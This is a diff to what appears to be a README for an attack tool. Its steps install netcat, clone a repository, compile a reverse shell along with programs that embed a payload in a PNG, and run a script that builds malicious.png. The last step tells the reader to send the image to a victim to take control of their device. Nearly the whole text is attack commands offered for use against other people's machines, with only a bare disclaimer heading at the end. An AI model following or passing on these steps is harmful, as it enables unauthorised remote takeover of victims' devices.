@@ -25,21 +25,25 @@ sudo apt install netcat-traditional -y
 git clone https://github.com/anknpolley123/polley.git
 
 # 4. Enter The Folder
-cd polley
+cd ~/polley
 
 # 5. Then, Compile The File reverse_shell.c
-gcc -o reverse_shell reverse_shell.c
+gcc reverse_shell.c -o reverse_shell
 
 # 6. Compile The File embed_payload.c
-gcc -o embed_payload.c embed_payload -lpng
+gcc embed_payload.c -o embed_payload -lpng
 
 # 7. Compile The File craft_malicious_png
-gcc -o craft_malicious_png craft_malicious_png.c -lpng
+gcc craft_malicious_png.c -o craft_malicious_png -lpng
 
-# 8. Run The Final Command
+# 8. Give permission 
+chmod +x run_all.sh
+
+# 9. Run The Final Command
 ./run_all.sh
 
-# 9. Send the Malicious File
+# 10. Send the Malicious File
+
 go to linux File manager, go to home, go to polley folder, select malicious.png, send it to the victim. You will get control of the victim's device in your linux terminal.
 
 # DISCLAIMER 
